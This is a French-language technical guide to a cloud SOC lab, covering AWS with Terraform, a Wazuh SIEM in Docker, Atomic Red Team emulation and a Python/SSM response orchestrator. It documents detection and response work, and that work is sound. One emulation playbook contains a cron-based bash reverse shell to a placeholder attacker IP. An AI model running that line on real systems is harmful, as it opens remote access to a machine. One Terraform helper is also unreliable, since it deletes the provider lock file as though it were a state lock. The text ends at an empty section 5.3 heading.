# Cloud SOC – Wazuh Threat Detection & Python Orchestrator
## Technical Architecture and Implementation Guide

**Chapters 4 & 5 - Technical Deep Dive**

---

## Table of Contents

- [Chapter 4: Architecture Technique de la Solution](#chapter-4-architecture-technique)
  - [4.1 Vue d'ensemble de l'architecture](#41-vue-densemble)
  - [4.2 Architecture Cloud AWS](#42-architecture-aws)
  - [4.3 Architecture DevSecOps](#43-architecture-devsecops)
  - [4.4 Architecture SOC](#44-architecture-soc)
  - [4.5 Architecture de Simulation d'Attaque](#45-architecture-simulation)
  - [4.6 Architecture de Réponse Automatisée](#46-architecture-reponse)
  - [4.7 Évolution de l'architecture](#47-evolution-architecture)
  - [4.8 Conclusion](#48-conclusion-chap4)

- [Chapter 5: Implémentation et Réalisation](#chapter-5-implementation)
  - [5.1 Déploiement de l'infrastructure AWS](#51-deploiement-aws)
  - [5.2 Déploiement de la Stack Wazuh](#52-deploiement-wazuh)
  - [5.3 Mise en place des Agents](#53-agents)
  - [5.4 Intégration AWS (S3, ECR, SSM)](#54-integration-aws)
  - [5.5 Développement des Scripts Python](#55-scripts-python)
  - [5.6 Conclusion](#56-conclusion-chap5)

---

# Chapter 4: Architecture Technique de la Solution {#chapter-4-architecture-technique}

## 4.1 Vue d'ensemble de l'architecture {#41-vue-densemble}

### Objectif Global

L'objectif principal de ce projet est de concevoir un environnement unifié de simulation, de détection et de remédiation des incidents de sécurité, capable de couvrir l'ensemble du cycle de g[...]

- **Émulation d'attaques** (Red Teaming)
- **Supervision centralisée** (Blue Teaming / SIEM)
- **Réponse automatisée** (SOAR)

### Séparation Plan de Contrôle / Plan de Données

Pour garantir la flexibilité et la reproductibilité, l'architecture repose sur un découplage strict :

#### Plan de Contrôle
- **Orchestrateur Python** exécuté localement
- **Interface CLI** (`cloud-soc`) pour piloter les opérations
- Localisation : Machine de l'ingénieur sécurité

#### Plan de Données
- **Infrastructure Cloud** sur Amazon Web Services (AWS)
- **Ressources réseau, machines, composants SOC**
- Localisation : VPC AWS 10.0.0.0/16

### Flux Cyclique Fermé

```
1. Orchestration (CLI Python)
   ↓
2. Red Team (Atomic Red Team / Émulation)
   ↓
3. SIEM (Wazuh - Détection)
   ↓
4. SOAR (Orchestrator.py - Réponse)
   ↓
   [Cycle répété]
```

**Point clé** : Aucune intervention manuelle nécessaire dans le cycle une fois déclenché.

---

## 4.2 Architecture Cloud AWS {#42-architecture-aws}

### 4.2.1 Réseau et Isolation : VPC SOC et Sous-réseaux

#### Configuration du VPC Principal

**Bloc CIDR** : `10.0.0.0/16`

```
VPC: 10.0.0.0/16
├── Subnet Public (NAT) : 10.0.0.0/24
├── Subnet Privé SOC : 10.0.1.0/24
└── Subnet Privé Victime : 10.0.2.0/24
```

#### Sous-réseau Public (NAT Gateway)
- **Bloc CIDR** : `10.0.0.0/24`
- **Rôle** : Hébergement de la passerelle NAT pour trafic outbound
- **Ressources** : NAT Gateway, Elastic IP
- **Accès** : Internet Gateway

#### Sous-réseau Privé SOC
- **Bloc CIDR** : `10.0.1.0/24`
- **Rôle** : Hébergement du cluster Wazuh (cœur du SOC)
- **Instances** : EC2 pour stack Wazuh (Manager, Indexer, Dashboard)
- **Caractéristiques** :
  - Aucune route vers Internet
  - Accès via NAT Gateway uniquement
  - Isolation maximale du cœur SOC

#### Sous-réseau Privé Victime
- **Bloc CIDR** : `10.0.2.0/24`
- **Rôle** : Hébergement des machines cibles pour tests
- **Instances** : EC2 Linux et Windows (machines victim)
- **Caractéristiques** :
  - Cloisonnement strict du SOC
  - Agents Wazuh collectent télémétrie
  - Trafic sécurisé vers SOC (port 1514 TLS)

### 4.2.2 Contrôle des Flux : Security Groups

#### SG-SIEM-Cluster (Cœur Wazuh)

| Direction | Port / Protocol | Source / Destination | Description |
|---|---:|---|---|
| Entrante | 1514 / TCP | 10.0.2.0/24 | Agent Collection |
| Entrante | 1515 / TCP | 10.0.2.0/24 | Agent Enrollment |
| Entrante | 9200 / TCP | 10.0.1.0/24 | Indexer API (inter-conteneurs) |
| Entrante | 443 / TCP | Via SSM Port Forwarding ONLY | Dashboard HTTPS (accessible uniquement via SSM Port Forwarding) |
| Sortante | All | 0.0.0.0/0 | Tout trafic permitted (nécessaire pour NAT Gateway) |

**Caractéristiques** :
- Aucun accès SSH direct (port 22 fermé)
- Aucun accès RDP direct
- Accès via AWS Systems Manager (SSM) uniquement

#### SG-Victim-Host (Machines Cibles)

| Direction | Port / Protocol | Source / Destination | Description |
|---|---:|---|---|
| Entrante (Normal) | 22 / TCP | (Déploiement initial) | SSH pour déploiement initial |
| Entrante (Normal) | 3389 / TCP | (Windows initial) | RDP pour Windows (initial) |
| Sortante | 1514 / TCP | 10.0.1.0/24 | Envoi vers Wazuh Manager |
| Transition d'Incident | - | - | Lors d'une alerte critique → Remplacement par `SG-Isolation` |
| SG-Isolation | All | — | Tous les trafics entrants/sortants bloqués SAUF SSM |

### 4.2.3 Calcul et Services de Support

#### EC2 Instances

**Instance SOC** :
- **Type** : `t3.medium` ou supérieur
- **Subnet** : 10.0.1.0/24 (Privé SOC)
- **Rôle IAM** : Rôle avec permissions Boto3 + SSM
- **Storage** : EBS 50-100 GB

**Instance Victime Linux** :
- **Type** : `t3.small`
- **AMI** : Ubuntu 22.04 LTS
- **Subnet** : 10.0.2.0/24 (Privé Victime)
- **Rôle IAM** : `AmazonSSMManagedInstanceCore`

**Instance Victime Windows** :
- **Type** : `t3.small`
- **AMI** : Windows Server 2022
- **Subnet** : 10.0.2.0/24
- **Rôle IAM** : `AmazonSSMManagedInstanceCore`

#### Identity and Access Management (IAM)

**Rôle pour Instance SOC** :
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "ec2:DescribeInstances",
        "ec2:DescribeSecurityGroups",
        "ec2:ModifyInstanceAttribute",
        "ssm:SendCommand",
        "ssm:GetCommandInvocation",
        "ssm:StartSession",
        "ecr:GetAuthorizationToken",
        "ecr:GetDownloadUrlForLayer",
        "ecr:BatchGetImage"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:PutObject",
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::wazuh-logs-*/*"
    }
  ]
}
```

#### ECR (Elastic Container Registry)

**Registre Privé** : `<account-id>.dkr.ecr.<region>.amazonaws.com`

**Images Gérées** :
- `wazuh-manager:4.14.4`
- `wazuh-indexer:4.14.4`
- `wazuh-dashboard:4.14.4`
- Images personnalisées avec outils de sécurité

**Mécanisme d'Authentification** :
```bash
aws ecr get-login-password --region eu-west-3 | \
  docker login --username AWS --password-stdin \
  <account-id>.dkr.ecr.eu-west-3.amazonaws.com
```

#### S3 (Simple Storage Service)

**Bucket Archivage Logs** : `wazuh-logs-<timestamp>`

**Politiques de Sécurité** :
- Versioning activé
- Block Public Access activé
- Encryption par défaut (AES-256)
- Lifecycle policy : Archivage après 90 jours

**Contenu** :
- Alertes Wazuh (JSON)
- Sauvegardes configurations
- Logs d'audit SOC

#### AWS Systems Manager (SSM)

**Composants** :
- **Session Manager** : Tunnels SSH chiffrés sans port 22
- **Run Command** : Exécution de commandes distantes
- **Port Forwarding** : Accès Dashboard Wazuh

**Avantages** :
- Aucun stockage de clés statiques
- Authentification IAM
- Audit complet des opérations

---

## 4.3 Architecture DevSecOps {#43-architecture-devsecops}

### 4.3.1 Infrastructure as Code (IaC) avec Terraform

#### Fichiers Terraform

**Localisation** : `/terraform/`

```
terraform/
├── main.tf                 # Orchestration principale
├── variables.tf            # Variables d'entrée
├── outputs.tf              # Valeurs de sortie
├── providers.tf            # Configuration AWS
├── network.tf              # VPC, subnets, routage
├── security_groups.tf      # Security Groups
├── instance.tf             # Instances EC2
├── iam.tf                  # Rôles IAM
├── ecr.tf                  # Registre ECR
├── s3.tf                   # Buckets S3
├── data.tf                 # Sources de données
├── random.tf               # Générateurs de valeurs aléatoires
├── backend.tf              # Configuration état Terraform
└── .terraform.lock.hcl     # Verrouillage versions providers
```

#### Modularité et Découplage

**Approche Modulaire** :

```hcl
# main.tf - Point d'entrée
terraform {
  required_version = ">= 1.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

module "network" {
  source = "./modules/network"
  vpc_cidr = var.vpc_cidr
  # ...
}

module "security" {
  source = "./modules/security"
  vpc_id = module.network.vpc_id
  # ...
}

module "compute" {
  source = "./modules/compute"
  subnet_id = module.network.private_subnet_id
  iam_role_arn = module.security.iam_role_arn
  # ...
}
```

#### État Terraform

**Fichier d'État** : `terraform.tfstate`

- **Source Unique de Vérité** pour l'infrastructure
- Stocké localement pour ce PoC
- Format JSON avec hashage ressources
- Synchronisation automatique avant chaque `apply`

**Commandes** :
```bash
terraform init      # Initialisation backend
terraform validate  # Validation syntaxe
terraform plan      # Aperçu changements
terraform apply     # Déploiement
terraform destroy   # Destruction ressources
```

### 4.3.2 Conteneurisation avec Docker et Gestion des Images via ECR

#### Docker Compose - Stack Wazuh

**Fichier** : `/wazuh-docker/docker-compose.yml`

```yaml
version: '3.9'

services:
  wazuh.manager:
    image: wazuh/wazuh-manager:4.14.4
    hostname: wazuh.manager
    restart: always
    ports:
      - "1514:1514"      # Agent collection TLS
      - "1515:1515"      # Agent enrollment
      - "514:514/udp"    # Syslog reception
      - "55000:55000"    # API REST
    environment:
      - INDEXER_URL=https://wazuh.indexer:9200
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=${INDEXER_PASSWORD}
      - SSL_CERTIFICATE_AUTHORITIES=/etc/ssl/root-ca.pem
      - SSL_CERTIFICATE=/etc/ssl/filebeat.pem
      - SSL_KEY=/etc/ssl/filebeat.key
    volumes:
      - wazuh_api_configuration:/var/ossec/api/configuration
      - wazuh_etc:/var/ossec/etc
      - wazuh_logs:/var/ossec/logs
      - wazuh_queue:/var/ossec/queue
      - ./config/wazuh_indexer_ssl_certs/:/etc/ssl/
      - ./config/wazuh_cluster/wazuh_manager.conf:/wazuh-config-mount/etc/ossec.conf

  wazuh.indexer:
    image: wazuh/wazuh-indexer:4.14.4
    hostname: wazuh.indexer
    restart: always
    ports:
      - "9200:9200"
    environment:
      - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer
      - ./config/wazuh_indexer_ssl_certs/:/usr/share/wazuh-indexer/config/certs/

  wazuh.dashboard:
    image: wazuh/wazuh-dashboard:4.14.4
    hostname: wazuh.dashboard
    restart: always
    ports:
      - "443:5601"
    environment:
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=${INDEXER_PASSWORD}
      - WAZUH_API_URL=https://wazuh.manager
      - API_USERNAME=${API_USERNAME}
      - API_PASSWORD=${API_PASSWORD}
    volumes:
      - ./config/wazuh_indexer_ssl_certs/:/usr/share/wazuh-dashboard/certs/

networks:
  wazuh-net:
    driver: bridge

volumes:
  wazuh_api_configuration:
  wazuh_etc:
  wazuh_logs:
  wazuh_queue:
  wazuh-indexer-data:
```

#### Microservices Architecture

**Conteneurs Isolés** :

| Service | Port | Rôle |
|---------|------|------|
| `wazuh.manager` | 1514/1515 | Réception + Analyse |
| `wazuh.indexer` | 9200 | Stockage + Indexation |
| `wazuh.dashboard` | 5601 | Visualisation |

**Avantages** :
- Isolation au niveau application
- Redémarrage indépendant
- Gestion ressources granulaire

### 4.3.3 Pipeline d'exécution et orchestration customisée

#### Moteur d'Orchestration Python

**Localisation** : `/cloudsoc/`

**Composants** :

```
cloudsoc/
├── main.py              # CLI Typer entrypoint
├── orchestrator.py      # Orchestrateurs (Terraform, Deployment, Dashboard)
├── terraform/
│   ├── runner.py        # Wrapper Terraform
│   └── imports.py       # Découverte ressources AWS
├── aws/
│   ├── ec2.py          # Gestion EC2
│   ├── iam.py          # Gestion IAM
│   ├── ssm.py          # AWS Systems Manager
│   ├── ecr.py          # Registre ECR
│   └── s3.py           # Stockage S3
├── deployment/
│   └── executor.py      # Exécuteur playbooks YAML
├── cleanup/
│   └── services.py      # Nettoyage ressources
├── config/
│   └── settings.py      # Configuration .env
└── utils/
    └── logger.py        # Logs structurés
```

#### Architecture CLI

**Entrypoint** : `cloud-soc`

```bash
cloud-soc --help
cloud-soc status
cloud-soc apply --auto-approve
cloud-soc deploy
cloud-soc deploy wazuh
cloud-soc dashboard
cloud-soc destroy --auto-approve --force
```

#### Interprétation Déclarative YAML

**Playbook Exemple** : `/playbooks/emulation/persistence_cron.yml`

```yaml
---
name: "Persistence via Cron"
description: "Simulate malicious cron entry (MITRE T1053.005)"
target: "victim-linux"
steps:
  - name: "Create malicious cron job"
    type: "shell"
    cmd: |
      echo "* * * * * /bin/bash -i >& /dev/tcp/{{ attacker_ip }}/4444 0>&1" | \
      crontab -u {{ target_user }} -
    skip_if_exists: "/var/spool/cron/crontabs/{{ target_user }}"
  
  - name: "Verify execution"
    type: "command"
    cmd: ["crontab", "-l"]
```

---

## 4.4 Architecture SOC {#44-architecture-soc}

### 4.4.1 La Stack Centrale Wazuh (Le Cluster de Supervision)

#### Wazuh Manager (Cerveau du SIEM)

**Rôle** : Analyse centralisée, corrélation d'événements

**Ports** :
- `1514/TCP` : Réception agents (chiffré TLS/Blowfish)
- `1515/TCP` : Authentification agents
- `55000/TCP` : API REST

**Configuration** : `/var/ossec/etc/ossec.conf`

```xml
<ossec_config>
  <global>
    <jsonout_output>yes</jsonout_output>
    <alerts_log>yes</alerts_log>
  </global>

  <remote>
    <connection>secure</connection>
    <port>1514</port>
    <protocol>tcp</protocol>
    <queue_size>131072</queue_size>
  </remote>

  <ruleset>
    <decoder_dir>ruleset/decoders</decoder_dir>
    <rule_dir>ruleset/rules</rule_dir>
    <rule_include>0530-ossec_rules.xml</rule_include>
    <rule_dir>etc/rules</rule_dir>
  </ruleset>
</ossec_config>
```

#### Wazuh Indexer (Plan de Stockage)

**Rôle** : Moteur de recherche OpenSearch (fork Elasticsearch)

**Port** : `9200/TCP`

**Capacités** :
- Indexation documents JSON
- Requêtes complexes (filtrage, agrégations)
- Rétention données (par défaut 90 jours)

**Configuration JVM** : `-Xms1g -Xmx1g` (adaptable à charge)

#### Wazuh Dashboard (Visualisation)

**Rôle** : Interface utilisateur de supervision

**Port** : `443/TCP` (HTTPS)

**Fonctionnalités** :
- Tableaux de bord analytiques
- Recherche en temps réel
- Gestion configuration cluster
- Alertes (notifications par email, webhook)

### 4.4.2 Collecte de la Télémétrie : Les Agents Linux et Windows

#### Enrôlement Sécurisé

**Processus** :

1. Agent contacte Manager sur port `1515`
2. Manager valide demande
3. Génération clé chiffrement unique
4. Stockage local `client.keys`

```bash
# Vérification agents enrôlés
/var/ossec/bin/manage_agents -l

# Sortie
ID: 001, Name: Linux-Victim-Node, IP: 10.0.2.15, Status: Active
ID: 002, Name: Windows-Victim-Node, IP: 10.0.2.32, Status: Active
```

#### Modules de Surveillance Linux

**Logcollector (Log Analysis)** :
- Fichiers monitorés : `/var/log/auth.log`, `/var/log/syslog`
- Real-time processing
- Regex decoding pour extraction champs

**Syscheck (FIM - File Integrity Monitoring)** :
```xml
<syscheck>
  <realtime>yes</realtime>
  <directories realtime="yes">/etc,/bin,/sbin,/tmp</directories>
  <ignore>/etc/mtab</ignore>
</syscheck>
```

**Rootcheck** :
- Détection rootkits
- Vérification conformité système
- Anomalies permissions

#### Modules de Surveillance Windows

**Event Channel Logging** :
- Event ID 4624 : Authentifications réussies
- Event ID 4625 : Authentifications échouées
- Event ID 4698 : Création tâche planifiée

```xml
<localfile>
  <location>Security</location>
  <log_format>eventchannel</log_format>
  <filter>Event/System/EventID=4698</filter>
</localfile>
```

---

## 4.5 Architecture de Simulation d'Attaque {#45-architecture-simulation}

### 4.5.1 Framework d'Émulation : Atomic Red Team (ART)

#### Principes

**Modularité Extreme** :
- Chaque technique MITRE ATT&CK = test atomique indépendant
- Dépendances minimales
- Exécution native shell (Bash / PowerShell)

**Absence Agent Persistant** :
- Pas de malware deployé
- Pas de C2 server
- Émulation pure comportementale

#### Structure Répertoires

```
playbooks/emulation/
├── persistence_cron.yml
├── discovery_processes.yml
├── lateral_movement_ssh.yml
└── [autres techniques]
```

### 4.5.2 Cartographie et Alignement avec la Matrice MITRE ATT&CK

#### Techniques Implémentées

| MITRE ID | Tactic | Technique | Playbook |
|----------|--------|-----------|----------|
| T1053.005 | Persistence | Scheduled Task: Cron | `persistence_cron.yml` |
| T1057 | Discovery | Process Discovery | `discovery_processes.yml` |
| T1021.002 | Lateral Movement | SSH | `lateral_movement_ssh.yml` |
| [Voir atomics/] | ... | ... | ... |

### 4.5.3 Architecture Conjointe et Ouverture vers MITRE Caldera

#### Approche Hybride

**Atomic Red Team** (Implémenté) :
- Tests unitaires de détection
- Scénarios simples, reproductibles
- Validation règles SIEM

**MITRE Caldera** (Future) :
- Opérations complexes multi-étapes
- Automatisation offensive adaptive
- C2 centralisé, agents déployés

---

## 4.6 Architecture de Réponse Automatisée {#46-architecture-reponse}

### 4.6.1 Le Moteur d'Orchestration Python (SOAR Customisé)

#### Fonctionnement

**Démon** : `orchestrator.py` exécuté en tâche de fond

**Cycle** :

```
1. Tail fichier alertes Wazuh (/var/ossec/logs/alerts/alerts.json)
   ↓
2. Parse JSON → Extraction rule.id, rule.level, agent.ip
   ↓
3. Évaluation filtres (level >= 10 ? → Action)
   ↓
4. Chargement playbook remédiation
   ↓
5. Exécution via DeploymentTask + Boto3/SSM
   ↓
6. Validation état remédiation
   ↓
   [Cycle répété]
```

### 4.6.2 Interaction avec le Plan de Contrôle : AWS Boto3 et AWS Systems Manager (SSM)

#### Isolation Réseau via Boto3

**Action** : Modification Security Group

```python
import boto3

ec2 = boto3.client('ec2', region_name='eu-west-3')

# Détacher SG production
ec2.modify_instance_attribute(
    InstanceId='i-0123456789abcdef0',
    Groups=['sg-isolation-group-id']
)
```

**Résultat** : Isolation instance en < 2 secondes (hyperviseur AWS)

#### Remédiation Système via SSM Run Command

**Action** : Arrêt processus malveillant

```python
ssm = boto3.client('ssm', region_name='eu-west-3')

ssm.send_command(
    InstanceIds=['i-0123456789abcdef0'],
    DocumentName='AWS-RunShellScript',
    Parameters={
        'commands': [
            'pkill -f malicious_process',
            'rm -f /tmp/backdoor.sh'
        ]
    },
    TimeoutSeconds=300
)
```

**Avantages** :
- Aucun SSH/RDP nécessaire
- Chiffrage natif AWS
- Audit traçable

---

## 4.7 Évolution de l'architecture {#47-evolution-architecture}

### 4.7.1 Architecture Initiale et Objectifs Primitifs

**Approche Monolithique Initiale** :
- Scripts séquentiels linéaires
- Couplage fort Infrastructure + Déploiement
- Accès directs via loopback (127.0.0.1)

### 4.7.2 Difficultés Rencontrées et Verrous Techniques

**Verrou 1 : Docker-in-Docker (Codespaces)** :
- Problème : Reverse proxy stricte, coupures TLS
- Solution : Mode réseau `host`, `forwardPorts` devcontainer.json

**Verrou 2 : Adresses IP Docker éphémères** :
- Problème : IPs changent à chaque redémarrage (172.18.0.X)
- Solution : Noms d'hôtes statiques, `extra_hosts` Docker Compose

**Verrou 3 : Gestion processus zombies SSM** :
- Problème : Tunnels persistants bloquent ports
- Solution : Gestionnaire de sessions persistent, cleanup approprié

### 4.7.3 Évolution vers une Architecture Modulaire et Choix Retenus

**Segmentation Blueprints** :
- Infrastructure `/terraform/`
- Émulation `/playbooks/emulation/`
- Réponse `/playbooks/response/`

**Résolution Réseau** :
- Python socket native pour découverte interfaces actives
- Couplage avec directives devcontainer pour forwarding

**Périmètre Rationalisé** :
- Focus Atomic Red Team (léger)
- Caldera comme future extension (intégration ultérieure)

---

## 4.8 Conclusion {#48-conclusion-chap4}

Ce chapitre a formalisé l'architecture technique globale du Cyber Range Cloud. Les différentes couches architecturales constituent un triptyque :

1. **DevSecOps** : IaC (Terraform) + Conteneurs (Docker) → Déploiement immuable
2. **SOC** : Wazuh SIEM + Agents → Visibilité complète
3. **Automation** : Python Orchestrator + Boto3/SSM → Réaction immédiate

L'évolution documentée démontre une architecture adaptée aux contraintes de production réelles, résiliente et scalable.

---

# Chapter 5: Implémentation et Réalisation {#chapter-5-implementation}

## 5.1 Déploiement de l'infrastructure AWS {#51-deploiement-aws}

### 5.1.1 Organisation et Structure du Code Terraform

**Arborescence** :

```
terraform/
├── main.tf                # Appel modules, provider AWS
├── variables.tf           # Déclaration variables
├── outputs.tf             # Sorties (IDs, IPs)
├── providers.tf           # Configuration provider AWS v5+
├── network.tf             # VPC, subnets, routage
├── security_groups.tf     # Groupes sécurité
├── instance.tf            # Instances EC2
├── iam.tf                  # Rôles/Politiques IAM
├── ecr.tf                  # Registre ECR
├── s3.tf                  # Buckets S3
├── data.tf                # Sources données (AMIs, etc.)
├── random.tf              # Générateurs noms
├── backend.tf              # State storage (local)
└── terraform.tfvars       # Valeurs variables (ignoré git)
```

### 5.1.2 Ressources Cloud Créées

#### VPC et Networking

```hcl
# network.tf
resource "aws_vpc" "wazuh_vpc" {
  cidr_block = "10.0.0.0/16"
  tags = {
    Name = "wazuh-vpc"
    Project = "cloud-soc"
  }
}

resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.wazuh_vpc.id
}

resource "aws_subnet" "nat_public" {
  vpc_id = aws_vpc.wazuh_vpc.id
  cidr_block = "10.0.0.0/24"
  map_public_ip_on_launch = true
}

resource "aws_subnet" "management_private" {
  vpc_id = aws_vpc.wazuh_vpc.id
  cidr_block = "10.0.1.0/24"
  map_public_ip_on_launch = false
}

resource "aws_subnet" "production_private" {
  vpc_id = aws_vpc.wazuh_vpc.id
  cidr_block = "10.0.2.0/24"
  map_public_ip_on_launch = false
}
```

#### Security Groups

```hcl
# security_groups.tf
resource "aws_security_group" "wazuh_manager" {
  name = "wazuh-manager-sg"
  vpc_id = aws_vpc.wazuh_vpc.id

  # Agent collection
  ingress {
    from_port = 1514
    to_port = 1514
    protocol = "tcp"
    cidr_blocks = ["10.0.2.0/24"]
  }

  # Agent enrollment
  ingress {
    from_port = 1515
    to_port = 1515
    protocol = "tcp"
    cidr_blocks = ["10.0.2.0/24"]
  }
}

resource "aws_security_group" "victim_host" {
  name = "victim-host-sg"
  vpc_id = aws_vpc.wazuh_vpc.id

  # Outbound to Wazuh
  egress {
    from_port = 1514
    to_port = 1514
    protocol = "tcp"
    cidr_blocks = ["10.0.1.0/24"]
  }
}
```

#### Instances EC2

```hcl
# instance.tf
resource "aws_instance" "wazuh_soc" {
  ami = data.aws_ami.ubuntu.id
  instance_type = "t3.medium"
  subnet_id = aws_subnet.management_private.id
  iam_instance_profile = aws_iam_instance_profile.wazuh_profile.name
  security_groups = [aws_security_group.wazuh_manager.id]

  tags = {
    Name = "wazuh-soc-server"
    Role = "siem"
  }
}

resource "aws_instance" "victim_linux" {
  ami = data.aws_ami.ubuntu.id
  instance_type = "t3.small"
  subnet_id = aws_subnet.production_private.id
  iam_instance_profile = aws_iam_instance_profile.victim_profile.name
  security_groups = [aws_security_group.victim_host.id]

  tags = {
    Name = "victim-linux-01"
    Role = "target"
  }
}
```

### 5.1.3 Difficultés Rencontrées et Résolutions Techniques

#### Défi 1 : Duplication Code Terraform (DRY Violation)

**Problème** : Configurations répétitives pour multiples instances/subnets

**Solution** : Utilisation `for_each` et `count`

```hcl
variable "instances" {
  type = map(object({
    instance_type = string
    subnet_key = string
  }))
  
  default = {
    "soc-manager" = {
      instance_type = "t3.medium"
      subnet_key = "management"
    }
    "victim-linux" = {
      instance_type = "t3.small"
      subnet_key = "production"
    }
  }
}

resource "aws_instance" "main" {
  for_each = var.instances
  
  ami = data.aws_ami.ubuntu.id
  instance_type = each.value.instance_type
  subnet_id = aws_subnet.subnets[each.value.subnet_key].id
}
```

#### Défi 2 : Gestion État Terraform (State Locking)

**Problème** : Fichier `terraform.tfstate` corrompu en cas interruption

**Solution** :

```python
# cloudsoc/terraform/runner.py
def run_terraform_command(cmd):
    # Vérifier absence locks orphelins
    lock_file = Path('.terraform.lock.hcl')
    if lock_file.exists():
        lock_file.unlink()
    
    # Refresh état avant apply
    subprocess.run(['terraform', 'refresh'], check=True)
    
    # Exécuter commande
    subprocess.run(['terraform'] + cmd, check=True)
```

---

## 5.2 Déploiement de la Stack Wazuh {#52-deploiement-wazuh}

### 5.2.1 Configuration et architecture réelle du Docker Compose

**Localisation** : `/wazuh-docker/docker-compose.yml`

La pile de supervision a été implémentée selon une architecture microservices stricte, avec une séparation claire entre le moteur de recherche, le gestionnaire de supervision et le tableau de bord. La configuration réelle utilisée dans le dépôt présente une topologie très proche du standard Wazuh officiel, mais adaptée au flux d'automatisation AWS/SSM du projet.

Le fichier de déploiement contient bien trois services principaux :

- `wazuh.manager` : conteneur principal du SIEM, exposant les ports `1514`, `1515`, `514/udp` et `55000` et montant les volumes `/var/ossec/...` pour la configuration, les alertes et la file de messages.
- `wazuh.indexer` : moteur de stockage et d'indexation OpenSearch, configuré avec `OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g` et monté avec des volumes persistants comme `wazuh-indexer-data`.
- `wazuh.dashboard` : interface web Wazuh Dashboard, exposée sur le port `443:5601` et reliée à l'indexer et au manager via les fichiers de configuration internes.

La configuration du dépôt inclut aussi la génération de certificats TLS pour chaque composant, avec montage de fichiers de certificat dans les chemins suivants :

- `/etc/ssl/root-ca.pem`
- `/etc/ssl/filebeat.pem`
- `/etc/ssl/filebeat.key`
- `/usr/share/wazuh-indexer/config/certs/...`
- `/usr/share/wazuh-dashboard/certs/...`

Cette structure est essentielle pour garantir l'authentification mutuelle entre les éléments du cluster et pour éviter toute communication non chiffrée sur le réseau interne VPC.

### 5.2.2 Génération des certificats et sécurisation du cluster Wazuh

La sécurisation du cluster a été intégrée au cycle de déploiement de manière explicite. La commande de génération des certificats est poussée dans le dépôt via le fichier `wazuh-docker/generate-indexer-certs.yml`, puis appelée à partir du playbook `playbooks/wazuh_manager.yml` :

```yaml
- name: Generate certificates if needed
  type: shell
  cmd: |
    if [ ! -d /opt/wazuh/config/wazuh_indexer_ssl_certs ] || [ -z "$(ls -A /opt/wazuh/config/wazuh_indexer_ssl_certs 2>/dev/null)" ]; then
      cd /opt/wazuh
      docker compose -f generate-indexer-certs.yml run --rm generator
    fi
```

Cette étape est cruciale, car les fichiers internes suivants sont ensuite servis à chaque conteneur :

- `root-ca.pem`
- `wazuh.indexer.pem` / `wazuh.indexer-key.pem`
- `wazuh.manager.pem` / `wazuh.manager-key.pem`
- `wazuh.dashboard.pem` / `wazuh.dashboard-key.pem`
- `admin.pem` / `admin-key.pem`

Le rôle de cette couche TLS est double :

1. sécuriser les flux entre `manager`, `indexer` et `dashboard` à l'intérieur du VPC ;
2. empêcher la détection d'un cluster Wazuh à partir d'un simple point d'accès réseau externe, en respectant la logique de confinement du projet.

### 5.2.3 Intégration réelle de Terraform + S3 + Docker dans le déploiement

Le projet ne se contente pas de lancer un `docker-compose` localement. Le flux réel de déploiement est le suivant :

1. Terraform crée les ressources AWS dans `/terraform/`.
2. Les fichiers Docker et config Wazuh sont uploadés dans S3 via `aws_s3_object` dans `terraform/s3.tf`.
3. Le playbook Wazuh (`playbooks/wazuh_manager.yml`) est exécuté via SSM sur l'instance `wazuh_server`.
4. Le playbook télécharge les artefacts depuis S3 vers `/opt/wazuh`.
5. Le conteneur Wazuh est démarré avec `docker compose -f /opt/wazuh/docker-compose.yml up -d`.

Le flux est homogène avec les objets Terraform suivants :

- `aws_s3_bucket.wazuh_assets`
- `aws_s3_bucket_versioning.wazuh_assets`
- `aws_s3_bucket_server_side_encryption_configuration.wazuh_assets`
- `aws_s3_bucket_public_access_block.wazuh_assets`
- `aws_s3_object.wazuh_docker_compose`
- `aws_s3_object.wazuh_manager_conf`
- `aws_s3_object.wazuh_indexer_config`
- `aws_s3_object.wazuh_dashboard_config`

Cette mécanique permet de garder les artefacts de configuration centralisés, versionnés et sécurisés, tout en évitant de dépendre d'un environnement local fragile pour la publication des fichiers de déploiement.

### 5.2.4 Verrous techniques rencontrés lors du déploiement réel

Le déploiement de cette pile dans un environnement d'intégration GitHub Codespaces / Docker-in-Docker a soulevé plusieurs blocages réels qui ont été explicitement traités dans le projet.

#### Défi 1 : identification réseau des services interne

Le manager et le dashboard tentaient de se connecter à l'indexer à partir d'un endpoint local ou d'une adresse IP statique. Cela ne fonctionnait pas correctement dans le contexte Docker, car chaque service est isolé dans son propre namespace réseau et le certificat TLS est généré pour des noms d'hôtes internes.

**Correction appliquée** : la configuration du déploiement a été standardisée autour des noms `wazuh.indexer`, `wazuh.manager` et `wazuh.dashboard`, avec des fichiers de configuration et des certificats liés à ces identités logiques. Le comportement de résolution est ainsi aligné sur les contraintes de sécurité TLS et la logique de conteneurisation.

#### Défi 2 : bootstrap Python/SSM + Docker Compose

Les playbooks ne se contentent pas d'installer Docker ; ils doivent également créer les dossiers, télécharger les artefacts, alors générer les certificats et lancer les services dans le bon ordre. Le schéma réel du playbook montre une séquence très stricte : installation des dépendances → création des répertoires → téléchargement des fichiers S3 → génération des certificats → lancement du cluster → validation d'état.

#### Défi 3 : validation de service après démarrage

Le playbook `wazuh_manager.yml` termine par une validation explicite :

```yaml
- name: Verify Wazuh services are running
  type: shell
  cmd: |
    cd /opt/wazuh
    docker compose ps
    echo "Waiting for services to stabilize..."
    sleep 5
    docker compose logs --tail 20 wazuh.manager | tail -10
```

Cette étape est cruciale, car le cluster Wazuh ne devient vraiment fonctionnel qu'après la publication des certificats, la fin du boot d'OpenSearch et la disponibilité du service API. La validation écrite dans le repository correspond à la réalité opérationnelle : le système est considéré "démarré" après vérification des conteneurs et non seulement après exécution du `docker compose up`.

---

## 5.3 Mise en place des agents {#53-agents}

